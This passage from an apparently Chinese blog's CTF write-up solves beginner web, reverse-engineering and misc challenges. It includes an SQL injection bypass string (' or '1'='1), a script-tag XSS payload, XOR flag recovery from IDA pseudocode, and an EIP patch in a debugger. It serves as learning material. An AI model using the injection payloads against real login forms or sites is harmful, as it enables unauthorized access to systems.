+<h1 id="6丶PHP是世界最好的语言-100"><a href="#6丶PHP是世界最好的语言-100" class="headerlink" title="6丶PHP是世界最好的语言(100)"></a>6丶PHP是世界最好的语言(100)</h1><p>访问题目页面，发现是一段PHP代码<br><img src="http://img.blog.csdn.net/20170903220451528?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br>分析发现它会get flag参数的值然后和WUU1 base64解码后的值进行比较，相等就输出flag。<br>解码WUU1为YE5<br><img src="http://img.blog.csdn.net/20170903220754130?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br>对题目页面发送get请求，参数为flag，值为YE5，得到flag<br><img src="http://img.blog.csdn.net/20170903220923852?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
+<h1 id="7丶SQL注入1-150"><a href="#7丶SQL注入1-150" class="headerlink" title="7丶SQL注入1(150)"></a>7丶SQL注入1(150)</h1><p>根据提示万能密码，直接在密码输入:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">or</span> <span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></figure></p>
+<p>得到flag<br><img src="http://img.blog.csdn.net/20170903221518732?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
+<h1 id="8丶XSS测试-150"><a href="#8丶XSS测试-150" class="headerlink" title="8丶XSS测试(150)"></a>8丶XSS测试(150)</h1><p>最简单的xss，把alert的值改成要求的就可以得到flag，即输入如下值提交：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(_key_)&lt;<span class="regexp">/script</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="http://img.blog.csdn.net/20170903222331647?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
+<h1 id="9丶SQL注入2-300"><a href="#9丶SQL注入2-300" class="headerlink" title="9丶SQL注入2(300)"></a>9丶SQL注入2(300)</h1><h3 id="4RE"><a href="#4RE" class="headerlink" title="4RE"></a>4RE</h3><h1 id="1丶RE1-100"><a href="#1丶RE1-100" class="headerlink" title="1丶RE1(100)"></a>1丶RE1(100)</h1><p>下载提供的exe文件，直接拖进ida进行分析，找到main函数，用快捷键F5将汇编转为伪C<br><img src="http://img.blog.csdn.net/20170903223928722?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br>分析下，就是获取输入的字符串和上面v4到v11变量的值连接成的值进行比较，相同就输出正确提示，根据char我们可以看出v4到v11这几个变量的值应该都是字符串，将变量值用R快捷键转换成字符。<br><img src="http://img.blog.csdn.net/20170903224527615?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br>将v4到v11变量的值连接起来应该就是flag了，但windows的程序都是用的小端字节序，所以要将每个变量的值倒过来排序，比如v4的值为”ESDX”倒过来就是”XDSE”，最后得到flag：XDSEC{ida_is_useful_in_reverse}</p>
+<h1 id="2丶RE2-200"><a href="#2丶RE2-200" class="headerlink" title="2丶RE2(200)"></a>2丶RE2(200)</h1><p>跟上题一样，下载提供的exe文件，直接拖进ida进行分析，找到main函数，用快捷键F5将汇编转为伪C，得到如下代码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx@1</span></span><br><span class="line">  __int64 v3; <span class="comment">// rdx@1</span></span><br><span class="line">  __int64 v4; <span class="comment">// rdx@1</span></span><br><span class="line">  <span class="keyword">char</span> c[<span class="number">29</span>]; <span class="comment">// [sp+20h] [bp-70h]@1</span></span><br><span class="line">  <span class="keyword">char</span> b[<span class="number">29</span>]; <span class="comment">// [sp+40h] [bp-50h]@1</span></span><br><span class="line">  <span class="keyword">char</span> flag[<span class="number">29</span>]; <span class="comment">// [sp+60h] [bp-30h]@1</span></span><br><span class="line">  <span class="keyword">int</span> sym; <span class="comment">// [sp+88h] [bp-8h]@1</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [sp+8Ch] [bp-4h]@1</span></span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  b[<span class="number">0</span>] = <span class="number">87</span>;</span><br><span class="line">  b[<span class="number">1</span>] = <span class="number">67</span>;</span><br><span class="line">  b[<span class="number">2</span>] = <span class="number">82</span>;</span><br><span class="line">  b[<span class="number">3</span>] = <span class="number">68</span>;</span><br><span class="line">  b[<span class="number">4</span>] = <span class="number">66</span>;</span><br><span class="line">  b[<span class="number">5</span>] = <span class="number">122</span>;</span><br><span class="line">  b[<span class="number">6</span>] = <span class="number">113</span>;</span><br><span class="line">  b[<span class="number">7</span>] = <span class="number">100</span>;</span><br><span class="line">  b[<span class="number">8</span>] = <span class="number">96</span>;</span><br><span class="line">  b[<span class="number">9</span>] = <span class="number">99</span>;</span><br><span class="line">  b[<span class="number">10</span>] = <span class="number">94</span>;</span><br><span class="line">  b[<span class="number">11</span>] = <span class="number">98</span>;</span><br><span class="line">  b[<span class="number">12</span>] = <span class="number">110</span>;</span><br><span class="line">  b[<span class="number">13</span>] = <span class="number">99</span>;</span><br><span class="line">  b[<span class="number">14</span>] = <span class="number">100</span>;</span><br><span class="line">  b[<span class="number">15</span>] = <span class="number">94</span>;</span><br><span class="line">  b[<span class="number">16</span>] = <span class="number">104</span>;</span><br><span class="line">  b[<span class="number">17</span>] = <span class="number">114</span>;</span><br><span class="line">  b[<span class="number">18</span>] = <span class="number">94</span>;</span><br><span class="line">  b[<span class="number">19</span>] = <span class="number">100</span>;</span><br><span class="line">  b[<span class="number">20</span>] = <span class="number">114</span>;</span><br><span class="line">  b[<span class="number">21</span>] = <span class="number">114</span>;</span><br><span class="line">  b[<span class="number">22</span>] = <span class="number">100</span>;</span><br><span class="line">  b[<span class="number">23</span>] = <span class="number">109</span>;</span><br><span class="line">  b[<span class="number">24</span>] = <span class="number">115</span>;</span><br><span class="line">  b[<span class="number">25</span>] = <span class="number">104</span>;</span><br><span class="line">  b[<span class="number">26</span>] = <span class="number">96</span>;</span><br><span class="line">  b[<span class="number">27</span>] = <span class="number">107</span>;</span><br><span class="line">  b[<span class="number">28</span>] = <span class="number">124</span>;</span><br><span class="line">  c[<span class="number">0</span>] = <span class="number">15</span>;</span><br><span class="line">  c[<span class="number">1</span>] = <span class="number">7</span>;</span><br><span class="line">  c[<span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">  c[<span class="number">3</span>] = <span class="number">1</span>;</span><br><span class="line">  c[<span class="number">4</span>] = <span class="number">1</span>;</span><br><span class="line">  c[<span class="number">5</span>] = <span class="number">1</span>;</span><br><span class="line">  c[<span class="number">6</span>] = <span class="number">3</span>;</span><br><span class="line">  c[<span class="number">7</span>] = <span class="number">1</span>;</span><br><span class="line">  c[<span class="number">8</span>] = <span class="number">1</span>;</span><br><span class="line">  c[<span class="number">9</span>] = <span class="number">7</span>;</span><br><span class="line">  c[<span class="number">10</span>] = <span class="number">1</span>;</span><br><span class="line">  c[<span class="number">11</span>] = <span class="number">1</span>;</span><br><span class="line">  c[<span class="number">12</span>] = <span class="number">1</span>;</span><br><span class="line">  c[<span class="number">13</span>] = <span class="number">7</span>;</span><br><span class="line">  c[<span class="number">14</span>] = <span class="number">1</span>;</span><br><span class="line">  c[<span class="number">15</span>] = <span class="number">1</span>;</span><br><span class="line">  c[<span class="number">16</span>] = <span class="number">1</span>;</span><br><span class="line">  c[<span class="number">17</span>] = <span class="number">1</span>;</span><br><span class="line">  c[<span class="number">18</span>] = <span class="number">1</span>;</span><br><span class="line">  c[<span class="number">19</span>] = <span class="number">1</span>;</span><br><span class="line">  c[<span class="number">20</span>] = <span class="number">1</span>;</span><br><span class="line">  c[<span class="number">21</span>] = <span class="number">1</span>;</span><br><span class="line">  c[<span class="number">22</span>] = <span class="number">1</span>;</span><br><span class="line">  c[<span class="number">23</span>] = <span class="number">3</span>;</span><br><span class="line">  c[<span class="number">24</span>] = <span class="number">7</span>;</span><br><span class="line">  c[<span class="number">25</span>] = <span class="number">1</span>;</span><br><span class="line">  c[<span class="number">26</span>] = <span class="number">1</span>;</span><br><span class="line">  c[<span class="number">27</span>] = <span class="number">7</span>;</span><br><span class="line">  c[<span class="number">28</span>] = <span class="number">1</span>;</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  sym = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">puts</span>(a1, a2, v2, <span class="string">"欢迎来到re200，请输入flag:"</span>);</span><br><span class="line">  gets(a1, a2, v3, flag);</span><br><span class="line">  <span class="keyword">while</span> ( sym &amp;&amp; i &lt;= <span class="number">28</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = (<span class="keyword">unsigned</span> __int8)b[i] ^ (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="keyword">unsigned</span> __int8)flag[i];</span><br><span class="line">    <span class="comment">//判断b数组和输入的字符串(即字符数组)进行异或操作后是否等于c数组的值</span></span><br><span class="line">    <span class="keyword">if</span> ( ((<span class="keyword">unsigned</span> __int8)b[i] ^ (<span class="keyword">unsigned</span> __int8)flag[i]) != c[i] )</span><br><span class="line">      sym = <span class="number">0</span>;</span><br><span class="line">    ++i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//如果b数组对应成员和输入的字符串(即字符数组)对应字符进行异或操作后是否等于c数组对应成员值，sym就等于0</span></span><br><span class="line">  <span class="comment">//等于0就输出正确提示</span></span><br><span class="line">  <span class="keyword">if</span> ( sym )</span><br><span class="line">    <span class="built_in">printf</span>(a1, a2, v4, <span class="string">"\n恭喜，你找到的是正确的flag！继续加油"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(a1, a2, v4, <span class="string">"flag有误哦，要不再试试？"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>关键的地方已给出注释，可以看出只要将b数组和c数组进行异或操作就可以得到flag，那写段C来完成操作吧！<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> b[] = <span class="string">"WCRDBzqd`c^bncd^hr^drrdmsh`k|"</span>;</span><br><span class="line">	<span class="keyword">int</span> c[] = &#123;<span class="number">15</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> a;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">29</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		a = b[i] ^ c[i];</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%c"</span>, a);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">	</span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>运行得到flag<br><img src="http://img.blog.csdn.net/20170903231358629?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
+<h1 id="3丶你是拥有霸王色运气的萌新吗？-300"><a href="#3丶你是拥有霸王色运气的萌新吗？-300" class="headerlink" title="3丶你是拥有霸王色运气的萌新吗？(300)"></a>3丶你是拥有霸王色运气的萌新吗？(300)</h1><p>这题还是一样，也用ida来分析，但这次关键点没在main函数里面而是在game()里面<br><img src="http://img.blog.csdn.net/20170903233359897?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br>game()函数转成伪C代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> <span class="title">game</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// eax@4</span></span><br><span class="line">  <span class="keyword">char</span> *v1; <span class="comment">// eax@10</span></span><br><span class="line">  <span class="keyword">char</span> v3[<span class="number">24</span>]; <span class="comment">// [sp+1Fh] [bp-A9h]@2</span></span><br><span class="line">  <span class="keyword">int</span> v4[<span class="number">24</span>]; <span class="comment">// [sp+37h] [bp-91h]@1</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [sp+97h] [bp-31h]@16</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [sp+98h] [bp-30h]@12</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [sp+9Fh] [bp-29h]@11</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [sp+A0h] [bp-28h]@11</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [sp+A4h] [bp-24h]@4</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [sp+A8h] [bp-20h]@1</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [sp+ACh] [bp-1Ch]@1</span></span><br><span class="line"></span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v4[<span class="number">0</span>] = *(_DWORD *)aZ_1;</span><br><span class="line">  v4[<span class="number">23</span>] = *(_DWORD *)&amp;aZ_1[<span class="number">92</span>];</span><br><span class="line">  qmemcpy(</span><br><span class="line">    (<span class="keyword">void</span> *)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;v4[<span class="number">1</span>] &amp; <span class="number">0xFFFFFFFC</span>),</span><br><span class="line">    (<span class="keyword">const</span> <span class="keyword">void</span> *)(aZ_1 - ((<span class="keyword">char</span> *)v4 - ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;v4[<span class="number">1</span>] &amp; <span class="number">0xFFFFFFFC</span>))),</span><br><span class="line">    <span class="number">4</span> * ((((<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;v4[<span class="number">24</span>] - ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;v4[<span class="number">1</span>] &amp; <span class="number">0xFFFFFFFC</span>)) &amp; <span class="number">0xFFFFFFFC</span>) &gt;&gt; <span class="number">2</span>));</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">23</span>; ++i )</span><br><span class="line">    v3[i] = v4[i];</span><br><span class="line">  v0 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v0);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"掷个6？试试手气吧，说不定就有了耶!(按任意键开始本次投掷)"</span>);</span><br><span class="line">  <span class="comment">//获取输入</span></span><br><span class="line">  v9 = getch();</span><br><span class="line">  <span class="comment">//产生随机数</span></span><br><span class="line">  v10 = random();</span><br><span class="line">  <span class="comment">//判断v10是否等于1，2，3，4，5，6中任意数，等于则输出一个字符串，不等于则返回传入值</span></span><br><span class="line">  showpoint(v10);</span><br><span class="line">  <span class="comment">//判断v10是否等于6</span></span><br><span class="line">  <span class="keyword">if</span> ( v10 != <span class="number">6</span> )</span><br><span class="line">  <span class="comment">//结束程序</span></span><br><span class="line">    gameover();</span><br><span class="line">  gamewin();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"掷个4？试试手气吧，说不定就有了耶!(按任意键开始本次投掷)"</span>);</span><br><span class="line">  v9 = getch();</span><br><span class="line">  v10 = random();</span><br><span class="line">  showpoint(v10);</span><br><span class="line">  <span class="keyword">if</span> ( v10 != <span class="number">4</span> )</span><br><span class="line">    gameover();</span><br><span class="line">  gamewin();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"掷个2？试试手气吧，说不定就有了耶!(按任意键开始本次投掷)"</span>);</span><br><span class="line">  v9 = getch();</span><br><span class="line">  v10 = random();</span><br><span class="line">  showpoint(v10);</span><br><span class="line">  <span class="keyword">if</span> ( v10 != <span class="number">2</span> )</span><br><span class="line">    gameover();</span><br><span class="line">  gamewin();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"掷个1？试试手气吧，说不定就有了耶!(按任意键开始本次投掷)"</span>);</span><br><span class="line">  v9 = getch();</span><br><span class="line">  v10 = random();</span><br><span class="line">  showpoint(v10);</span><br><span class="line">  <span class="keyword">if</span> ( v10 != <span class="number">1</span> )</span><br><span class="line">    gameover();</span><br><span class="line">  gamewin();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"掷个3？试试手气吧，说不定就有了耶!(按任意键开始本次投掷)"</span>);</span><br><span class="line">  v9 = getch();</span><br><span class="line">  v10 = random();</span><br><span class="line">  showpoint(v10);</span><br><span class="line">  <span class="keyword">if</span> ( v10 != <span class="number">3</span> )</span><br><span class="line">    gameover();</span><br><span class="line">  gamewin();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"掷个5？试试手气吧，说不定就有了耶!(按任意键开始本次投掷)"</span>);</span><br><span class="line">  v9 = getch();</span><br><span class="line">  v10 = random();</span><br><span class="line">  showpoint(v10);</span><br><span class="line">  <span class="keyword">if</span> ( v10 != <span class="number">5</span> )</span><br><span class="line">    gameover();</span><br><span class="line">  LOBYTE(v1) = <span class="built_in">puts</span>(<span class="string">"哇，不知道你是霸王色运气还是技术好呢，总之恭喜啦，为你献上flag："</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">14997</span>; i += <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = (<span class="keyword">unsigned</span> __int8)ida[i];</span><br><span class="line">    v7 = ida[i + <span class="number">2</span>];</span><br><span class="line">    LOBYTE(v1) = v8;</span><br><span class="line">    <span class="keyword">switch</span> ( v8 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        v6 = (<span class="keyword">unsigned</span> __int8)ida[i + <span class="number">1</span>];</span><br><span class="line">        v1 = &amp;v3[v6];</span><br><span class="line">        v3[v6] += v7;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        v6 = (<span class="keyword">unsigned</span> __int8)ida[i + <span class="number">1</span>];</span><br><span class="line">        v1 = &amp;v3[v6];</span><br><span class="line">        v3[v6] -= v7;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        v6 = (<span class="keyword">unsigned</span> __int8)ida[i + <span class="number">1</span>];</span><br><span class="line">        LOBYTE(v1) = v7 ^ v3[v6];</span><br><span class="line">        v3[v6] = (<span class="keyword">char</span>)v1;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        v6 = (<span class="keyword">unsigned</span> __int8)ida[i + <span class="number">1</span>];</span><br><span class="line">        v1 = &amp;v3[v6];</span><br><span class="line">        v3[v6] *= v7;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        v6 = (<span class="keyword">unsigned</span> __int8)ida[i + <span class="number">1</span>];</span><br><span class="line">        v5 = ida[i + <span class="number">2</span>];</span><br><span class="line">        v1 = &amp;v3[v6];</span><br><span class="line">        v3[v6] ^= ida[i + <span class="number">2</span>];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">23</span>; ++i )</span><br><span class="line">    LOBYTE(v1) = <span class="built_in">putchar</span>(v3[i]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>分析可以发现，这个函数首先会进行6次生成随机数并进行判断，只有6次随机值等于预设值才会生成flag，这下知道为什么题目说要拥有霸王色运气了吧^-^!<br>这个的话我们就可以在第一次进行比较前下断点，然后修改EIP到第一个for的地址，直接跳过6次判断直接生成flag输出了。。<br>ida支持在伪C代码里面直接下断点<br><img src="http://img.blog.csdn.net/20170904000535041?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br>这里有个坑就是程序运行完不会暂停，所以要在game()函数的返回处也下个断点，好观察输出的flag<br><img src="http://img.blog.csdn.net/20170904000804898?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br>下好断点后我们按F9快捷键选择Local win32 debugger，在次按F9就可以进行调试了<br>程序断下来后，直接修改将ETP的值修改为“mov     dword ptr [esp], offset aGmKULGmOZGmKUF ; “哇，不知道你是霸王色运气还”…”这条指令的地址。。<br><img src="http://img.blog.csdn.net/20170904001457325?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br>在次F9就可以得到flag了<br><img src="http://img.blog.csdn.net/20170904001646861?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
+<h3 id="5丶MISC"><a href="#5丶MISC" class="headerlink" title="5丶MISC"></a>5丶MISC</h3><h1 id="1丶神秘代码-30"><a href="#1丶神秘代码-30" class="headerlink" title="1丶神秘代码(30)"></a>1丶神秘代码(30)</h1><p>提示为base64，那直接将提供的字符串进行base64解码得到flag</p>
+<p><img src="http://img.blog.csdn.net/20170904203646647?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
